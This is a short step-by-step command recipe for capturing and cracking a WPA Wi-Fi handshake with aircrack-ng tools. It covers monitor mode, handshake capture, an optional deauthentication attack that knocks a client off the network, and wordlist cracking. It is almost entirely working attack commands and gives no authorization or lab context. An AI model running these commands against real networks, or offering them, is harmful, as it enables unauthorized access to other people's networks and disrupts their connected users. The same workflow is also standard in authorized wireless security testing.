1. Put your wireless adapter in monitor mode:
   ```
   airmon-ng start <interface>
   ```

2. Capture handshake:
   ```
   airodump-ng -c <channel> --bssid <target_MAC> -w <output_file> <interface>
   ```

3. (Optional) Deauthenticate a client to force reconnection and capture handshake:
   ```
   aireplay-ng -0 1 -a <target_MAC> -c <client_MAC> <interface>
   ```

4. Once you have the handshake, stop the capture.

5. Use a wordlist to attempt cracking:
   ```
   aircrack-ng <capture_file> -w <wordlist_file>
   ```